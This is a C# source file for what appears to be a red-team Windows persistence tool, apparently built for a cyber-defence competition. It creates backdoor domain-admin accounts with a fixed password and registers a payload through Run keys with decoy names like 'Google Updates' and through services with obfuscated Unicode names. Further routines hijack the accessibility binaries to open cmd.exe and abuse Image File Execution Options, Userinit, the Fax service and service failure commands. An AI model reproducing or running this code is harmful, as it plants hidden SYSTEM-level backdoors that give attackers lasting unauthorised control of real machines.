using System;
using System.Data;
using System.DirectoryServices;
using System.Collections.Generic;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;


namespace ezclap
{
    class Program
    {
        public static void modifyFaxService(string payload)
        {
            string arguments = "config Fax " + " binPath= \"cmd.exe /c " + payload + "\" start=\"auto\" obj=\"LocalSystem\" ";
            System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", arguments);
        }

        public static void modifyFailureService(List<string> services, string payload)
        {
            foreach (string service in services)
            {
                string argument = "/C sc failure " + service + " reset= 10 actions= run/5000 command= \"" + payload + "\"";
                System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", argument);
            }
        }


        /*
         * Description: Create scheduled task with SYSTEM privilege, with a specific payload.
         * 
         * Params:
         *  - (string) scheduledTaskName    = Name of the scheduled Task to be created 
         *  - (string) payload              = Payload to be executed when the scheduled Task runs 
         *  - (int)    often                = How often the scheduled task will run in an interval 
         * 
         */
        public static void createScheduledTask(string scheduledTaskName, string payload, int often)
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.Principal.RunLevel = TaskRunLevel.Highest;
                // public TaskInstancesPolicy MultipleInstances { get; set; } 
                // Needed for creating multiple instances of the payload 
                td.Settings.MultipleInstances = TaskInstancesPolicy.Parallel;
                td.RegistrationInfo.Description = "Refresh Scoring Engine Workers for scoreboard";

                // Add interval for Scheduled task. Default 20 minutes 
                TimeTrigger tt = new TimeTrigger();
                tt.Repetition.Interval = TimeSpan.FromMinutes(often);
                td.Triggers.Add(tt);

                // Path to action, Arguments, working directory 
                td.Actions.Add(new ExecAction(payload, null, null));

                // Create Scheduled Task with names and run 
                ts.RootFolder.RegisterTaskDefinition(scheduledTaskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);
                TaskService.Instance.GetTask(scheduledTaskName).Run();
            }

        }

        public static void modifyImageFileExec(string payload)
        {

            RegistryKey imageFileExecKey = Registry.LocalMachine.OpenSubKey(RegistryKeys.hklmImageFileExec);
            string[] targetExec = new string[] { "notepad.exe", "taskmgr.exe" };
            foreach (string target in targetExec)
            {
                string finalImageFileExec = RegistryKeys.hklmImageFileExec + "\\" + target;
                Utils.setHKLMSubKey(finalImageFileExec, "GlobalFlag", 512);

                string finalSilentProcExit = RegistryKeys.hklmSilentProcessExit + "\\" + target;
                Utils.setHKLMSubKey(finalSilentProcExit, "ReportingMode", 1);
                Utils.setHKLMSubKey(finalSilentProcExit, "MonitorProcess", payload);

            }
            /*  This is way too destructive and have a chance to bomb the box. Removing for now... 
            foreach (var v in imageFileExecKey.GetSubKeyNames() ) 
            {
                try{
                    string finalLocation = RegistryKeys.hklmImageFileExec + "\\" + v;
                    setHKLMSubKey(finalLocation, "GlobalFlag", 512);

                    string silentProcesExitFinal = RegistryKeys.hklmSilentProcessExit + "\\" + v;
                    setHKLMSubKey(silentProcesExitFinal, "ReportingMode", 1);
                    setHKLMSubKey(silentProcesExitFinal, "MonitorProcess", payload);
                }
                catch(Exception e){
                    continue;
                } 
            }
            */
        }

        public static void modifyAccessbility()
        {
            string[] accessibility = new string[] { "sethc.exe", "utilman.exe", "Magnify.exe", "Narrator.exe" };
            foreach (string binary in accessibility)
            {
                string finalLoc = RegistryKeys.hklmImageFileExec + "\\" + binary;
                Utils.setHKLMSubKey(finalLoc, "Debugger", "C:\\Windows\\System32\\cmd.exe");
            }
        }

        static void Main(string[] args)
        {


            //string[] domainAdmins = new string[] { "joe", "bob", "michael", "whiteteamer", "blackteamer", "scoringengine" };
            //string[] randomUsers = new string[] { "father", "son", "cattails", "watershell", "headshot", "detcord", "silenttrinity" };
            // =================================================================================================================

            string[] users = new string[] { "bob", "doe" };
            string[] groups = new string[] { "Domain Admins", "Administrators", "Enterprise Admins" };
            string password = "Password123!";
            string payload = "c:\\Users\\Administrator\\Desktop\\agent.exe";

            /*
             *  0. Setup 
             *      A) LowRiskFileTypes --> bypass bat, exe, ps1 
             *      B) Turn off windows defender completely --> Ask blackteam/redteam about if this is even needed 
             *      C) Enable PSremoting, Winrm (?) 
             *      D) Drop all firewall rules 
             */


            Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
            Console.WriteLine(RegistryKeys.hklmImagePath);

            // 0. Dropping payload, changing it to random names, timestomping, etc...

            // 1. Create Backdoor users 
            AddUser persist_adduser = new AddUser(users, password, groups);

            
            // 2. Create Runkey registry with payloads 
            string[] names = new string[] { "Application Security", "Backup", "Appsec", "Google Updates", "Microsoft Credential Guard", "duderino", "catchmeifyoucan" };
            AddRunKey persist_addrunkey = new AddRunKey(names, payload);
            
            
            // 3. Create a malicious service --> Through sc? Or actually through installer route? 
            string unicodeServiceName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
            string easyServiceName = "Application Security";
            AddService uniService =  new AddService(unicodeServiceName, payload);
            AddService easyService = new AddService(easyServiceName, payload);

            /*
            // 4. Create scheduled task 
            string scheduledTaskName = "GoogleUpdateTaskMachineMaster";
            string unicodeScheduledTaskName = "樂𐐷𐐷𐐷𐐷𐐷𐐷쀍승관𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𤭢𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𐐷𤭢𤭢𤭢𤭢𤭢𤭢𤭢樂쳌쳌쳌쳌쀍";
            createScheduledTask(scheduledTaskName, payload, 20);
            createScheduledTask(unicodeScheduledTaskName, payload, 20);

            // 5. Create startup folder persistence 

            // 6. Create utilman and sceth (sticky) persistence 
            modifyAccessbility();

            // 7. Modify userinit 
            setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload + ", C:\\Windows\\System32\\userinit.exe");

            // 8. Modify Fax - Windows client only 
            modifyFaxService(payload);

            // 9. Modify ImagePath 
            setHKLMSubKey(RegistryKeys.hklmImagePath, "ImagePath", payload);
            
            // 10. Modify FailureCommand 
            List<string> servicesList = new List<string>();
            servicesList = getAllServices();
            modifyFailureService(servicesList, payload);
            
            // 11. Modify Image File Execution             
            //modifyImageFileExec(payload);

            modifyAccessbility();
            */
            
            
            Console.ReadLine();

        }
    }
}
